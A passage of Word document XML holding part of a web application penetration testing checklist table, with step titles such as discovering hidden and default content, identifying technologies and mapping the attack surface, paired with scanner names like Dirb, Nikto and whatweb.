            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="2F587D85" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A32E1E" w14:paraId="16660BF0" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="142" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1369" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="1529F754" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>1.2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3411" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="06021F5F" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRPr="005A1C80" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Other content</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3445" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="1A7A286D" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00FD2DA4" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Dirb, Nikto</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1061" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="5B6D97D1" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A32E1E" w14:paraId="67903100" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="283" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1228" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="63E4B5F3" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3411" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="58251B38" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRPr="005A1C80" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Discover hidden content</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3445" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="22921B6C" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00AE00B2" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Dirb</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1061" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="5A32BD2C" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A32E1E" w14:paraId="161F1AA7" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="283" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1228" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="21B4BC0C" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3411" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="2D9ED32E" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRPr="005A1C80" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Discover default content</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3445" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="411855BE" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00AE00B2" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Nikto</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1061" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="5D9E1F2E" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A32E1E" w14:paraId="35DB7E33" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="142" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1369" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="424E4492" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>1.3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3411" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="4FA96EF4" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRPr="005A1C80" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Non-standard access methods</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3445" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="32125F48" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1061" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="05DE226E" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A32E1E" w14:paraId="60BD3DCD" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="283" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1228" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="408532C2" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3411" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="50F91A36" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRPr="005A1C80" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Identifier specified functions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3445" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="7F6F6C5E" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1061" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="709D61C9" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A32E1E" w14:paraId="5894ED21" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="283" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1228" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="56F8BCF6" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3411" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="1F75FAE4" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRPr="005A1C80" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Debug parameters</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3445" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="0C26C849" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1061" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="46DE48A0" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A32E1E" w14:paraId="421CDD33" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1511" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="6459DE02" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3411" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="66A6D674" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRPr="005A1C80" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Analyze the application</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3445" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="297E1747" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1061" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="654FD149" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A32E1E" w14:paraId="76DB40EE" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="142" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1369" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="685EB4C8" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:bookmarkStart w:id="5" w:name="_Hlk57732004"/>
            <w:r>
              <w:t>2.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3411" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="144A52E5" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRPr="005A1C80" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Identify functionality</w:t>
            </w:r>
            <w:r w:rsidR="00A0010C" w:rsidRPr="005A1C80">
              <w:t xml:space="preserve"> and data entry points</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3445" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="025AE6CC" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1061" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="7454DE26" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A32E1E" w14:paraId="298FFE3C" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="142" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1369" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="5456D53C" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>2.3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3411" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="223F327E" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRPr="005A1C80" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Identify technologies</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3445" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="6D80E17D" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="008914B3" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>whatweb</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1061" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="045770D3" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A32E1E" w14:paraId="37E6926C" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="142" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1369" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="14190463" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>2.4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3411" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="1ECA1379" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRPr="005A1C80" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Map the attack surface</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3445" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="4959C3B3" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1061" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="13B59374" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:bookmarkEnd w:id="5"/>
    </w:tbl>
    <w:p w14:paraId="238C0570" w14:textId="77777777" w:rsidR="00CD4824" w:rsidRDefault="00CD4824" w:rsidP="00CD4824">
      <w:pPr>
        <w:spacing w:line="320" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DB9691C" w14:textId="77777777" w:rsidR="003D55C7" w:rsidRPr="00ED3CCF" w:rsidRDefault="003D55C7" w:rsidP="00BB1E41">
      <w:pPr>
        <w:spacing w:line="320" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="0D2B3E" w:themeColor="accent3" w:themeShade="80"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00ED3CCF">
        <w:rPr>
          <w:color w:val="0D2B3E" w:themeColor="accent3" w:themeShade="80"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Application Logic</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="9562" w:type="dxa"/>
        <w:tblInd w:w="250" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="107"/>
        <w:gridCol w:w="106"/>
        <w:gridCol w:w="1346"/>
        <w:gridCol w:w="3402"/>
        <w:gridCol w:w="3402"/>
        <w:gridCol w:w="1199"/>
      </w:tblGrid>
      <w:tr w:rsidR="00F33EAA" w14:paraId="001EB8FE" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1559" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="5D0245B1" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:bookmarkStart w:id="6" w:name="_Hlk55905782"/>
            <w:r>
              <w:t>Step Number</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="3B386E12" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Step Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="7EE3690C" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Tools</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="7542009F" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F33EAA" w14:paraId="5213C0BB" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1559" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="35ABAB09" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="15CD4C0B" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Test Client Side </w:t>
            </w:r>
            <w:r w:rsidR="005532E8">
              <w:t>Controls</w:t>
            </w:r>
